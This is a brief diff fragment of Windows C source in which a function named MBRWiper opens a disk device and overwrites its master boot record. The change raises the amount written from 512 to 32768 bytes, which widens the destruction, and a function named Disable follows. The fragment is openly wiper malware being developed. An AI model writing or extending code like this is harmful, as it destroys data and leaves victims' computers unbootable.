@@ -2253,7 +2253,7 @@ DWORD WINAPI MBRWiper(LPVOID lpParam) {
 		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
 		OPEN_EXISTING, 0, 0);
 
-	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
+	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
 	return 1;
 }
 DWORD WINAPI Disable(LPVOID lpParam) {
